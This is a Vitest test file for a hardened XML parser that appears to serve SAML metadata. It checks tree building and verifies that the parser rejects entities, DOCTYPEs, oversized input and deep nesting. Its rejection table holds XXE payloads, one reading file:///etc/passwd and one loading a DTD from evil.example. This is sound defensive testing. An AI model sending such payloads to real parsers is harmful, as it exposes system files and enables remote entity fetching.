import { describe, expect, it } from 'vitest';

import { ValidationError } from '@blackwing/errors';

import { childrenNamed, descendantsNamed, MAX_XML_BYTES, parseXmlSafely } from './xml.js';

const MD = 'urn:oasis:names:tc:SAML:2.0:metadata';

describe('parseXmlSafely', () => {
  it('builds the element tree with namespaces, unnamespaced attributes and text', () => {
    const root = parseXmlSafely(
      '<?xml version="1.0"?><md:A xmlns:md="urn:md" id="x"><md:B k="v">hello</md:B><md:B/></md:A>',
    );
    expect(root.uri).toBe('urn:md');
    expect(root.local).toBe('A');
    expect(root.attributes.get('id')).toBe('x');
    expect(childrenNamed(root, 'urn:md', 'B')).toHaveLength(2);
    expect(childrenNamed(root, 'urn:md', 'B')[0]?.text).toBe('hello');
    expect(childrenNamed(root, 'urn:md', 'B')[0]?.attributes.get('k')).toBe('v');
  });

  it('finds descendants depth first', () => {
    const root = parseXmlSafely(`<a xmlns="${MD}"><b><c/></b><c/></a>`);
    expect(descendantsNamed(root, MD, 'c')).toHaveLength(2);
  });

  it.each([
    [
      'an external entity (XXE, CWE-611)',
      '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
    ],
    [
      'an internal entity declaration (entity expansion)',
      '<!DOCTYPE r [<!ENTITY a "aaa">]><r>&a;</r>',
    ],
    ['a DOCTYPE without entities', '<!DOCTYPE r><r/>'],
    ['a lower-case declaration', '<!doctype r><r/>'],
    ['a parameter-entity declaration', '<!ENTITY % p SYSTEM "http://evil.example/x.dtd"><r/>'],
  ])('refuses %s', (_name, xml) => {
    expect(() => parseXmlSafely(xml)).toThrow(ValidationError);
  });

  it('refuses a document over the byte limit before parsing it', () => {
    const big = `<r>${'a'.repeat(MAX_XML_BYTES)}</r>`;
    expect(() => parseXmlSafely(big)).toThrow(/too large/);
  });

  it('refuses a document that is not well formed', () => {
    expect(() => parseXmlSafely('<r><unclosed></r>')).toThrow(ValidationError);
    expect(() => parseXmlSafely('not xml at all')).toThrow(ValidationError);
  });

  it('refuses more than one root element', () => {
    expect(() => parseXmlSafely('<a/><b/>')).toThrow(ValidationError);
  });

  it('refuses an empty document', () => {
    expect(() => parseXmlSafely('')).toThrow(ValidationError);
  });

  it('refuses more elements than the element budget', () => {
    const body = '<e/>'.repeat(5_001);
    expect(() => parseXmlSafely(`<r>${body}</r>`)).toThrow(ValidationError);
  });

  it('refuses nesting deeper than the depth budget', () => {
    const open = '<n>'.repeat(65);
    const close = '</n>'.repeat(65);
    expect(() => parseXmlSafely(`${open}${close}`)).toThrow(ValidationError);
  });
});
